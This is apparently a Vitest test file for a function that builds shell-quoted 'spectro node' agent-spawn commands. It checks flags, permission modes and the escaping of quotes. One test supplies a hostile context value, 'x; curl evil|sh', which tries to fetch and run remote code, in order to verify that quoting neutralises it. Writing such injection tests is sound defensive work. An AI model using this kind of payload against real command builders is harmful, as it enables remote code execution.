import { describe, it, expect } from "vitest";
import { buildNodeCommand, type NodeSpawnFields } from "./nodeCommand";

const base: NodeSpawnFields = { prompt: "scan the logs", context: "pr-42", role: "worker", id: "", linger: false };

describe("buildNodeCommand", () => {
  it("builds a minimal command: every value shell-quoted, ask by default for a full-power node", () => {
    expect(buildNodeCommand(base, 7000, "ask")).toBe(
      "spectro node -p 'scan the logs' --hub 127.0.0.1:7000 --context 'pr-42' --permissions ask",
    );
  });

  it("omits the worker role (the default) but names a non-default role, quoted", () => {
    expect(buildNodeCommand({ ...base, role: "reviewer" }, 7000, "ask")).toContain("--role 'reviewer'");
    expect(buildNodeCommand(base, 7000, "ask")).not.toContain("--role");
  });

  it("includes an explicit id (quoted) and the linger flag when set", () => {
    const cmd = buildNodeCommand({ ...base, id: "rev-1", linger: true }, 7000, "auto");
    expect(cmd).toContain("--id 'rev-1'");
    expect(cmd).toContain("--linger");
    expect(cmd).toContain("--permissions auto");
  });

  it("single-quotes the prompt and escapes embedded single quotes", () => {
    const cmd = buildNodeCommand({ ...base, prompt: "it's a test" }, 7000, "ask");
    expect(cmd).toContain("-p 'it'\\''s a test'");
  });

  it("shell-quotes a hostile context so a bus-seeded value cannot break out", () => {
    const cmd = buildNodeCommand({ ...base, context: "x; curl evil|sh" }, 7000, "ask");
    expect(cmd).toContain("--context 'x; curl evil|sh'");
    expect(cmd).not.toContain("--context x; curl");
  });

  it("falls back to a metacharacter-free placeholder when the hub port is unknown", () => {
    expect(buildNodeCommand(base, null, "ask")).toContain("--hub 127.0.0.1:HUB_PORT");
  });

  it("omits --permissions for readonly (the node default), fills quoted placeholders for empty fields", () => {
    const cmd = buildNodeCommand({ prompt: "", context: "", role: "worker", id: "", linger: false }, 7000, "readonly");
    expect(cmd).not.toContain("--permissions");
    expect(cmd).toContain("--context '<context>'");
    expect(cmd).toContain("-p '<prompt>'");
  });
});
